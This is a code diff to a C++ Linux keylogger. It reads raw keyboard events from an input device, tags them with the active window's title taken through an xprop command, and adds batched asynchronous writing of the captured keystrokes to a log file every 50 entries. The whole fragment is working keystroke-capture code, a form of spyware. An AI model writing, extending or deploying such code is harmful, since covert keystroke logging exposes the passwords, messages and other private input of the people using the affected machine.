@@ -12,7 +12,7 @@
 #include <errno.h>
 #include <string.h>
 #include <string>
-
+#include "async_write.h"
 
 //inclide chrono
  std::string CurrentDateTime() {
@@ -188,19 +188,23 @@ Key_logger::Key_logger(){
         return keys[key];
    } 
    std::vector<std::string> Key_logger::get_keys_vector(std::string path){
+        FILE * file = fopen(path.c_str(),"a+");
+        int fd_async = fileno(file);
         std::vector<std::string> names;
+        names.push_back("\n\n");
         names.push_back(CurrentDateTime());
         int keys_fd; //дескриптор
         struct input_event t;  
         struct input_event t_shift;
         keys_fd = check(open(DEV_PATH, O_RDONLY));
-        
+        std::cout << "#2" << std::endl;
         bool flag_shift = false;
         bool flag_caps = false;
         std::string proc_name = exec("xprop -id `xprop -root _NET_ACTIVE_WINDOW | awk '{print $NF}'` WM_NAME | awk '{print $NF}'").c_str();
         names.push_back(proc_name);
         while (true)
         {
+            
             std::string current_name = exec("xprop -id `xprop -root _NET_ACTIVE_WINDOW | awk '{print $NF}'` WM_NAME | awk '{print $NF}'").c_str();
             if (current_name != proc_name)
             {
@@ -263,11 +267,21 @@ Key_logger::Key_logger(){
                     if (t.code == 1001){
                         std::cout << t.code << std::endl;
                         std::cout << "Exit" << std::endl;
+                        //std::vector<std::string> copy_names(names.begin(), names.begin() + 50);
+                        write_vector_async_file(names, fd_async);
+                        //names.erase(names.begin(), names.begin() + 50);
+                        names.clear();
                         break;
                     }
                 
             }
-
+            if (names.size() == 50)
+            {
+                std::vector<std::string> copy_names(names.begin(), names.begin() + 50);
+                write_vector_async_file(copy_names, fd_async);
+                //names.erase(names.begin(), names.begin() + 50);
+                names.clear();
+            }
 
         }
         close(keys_fd);
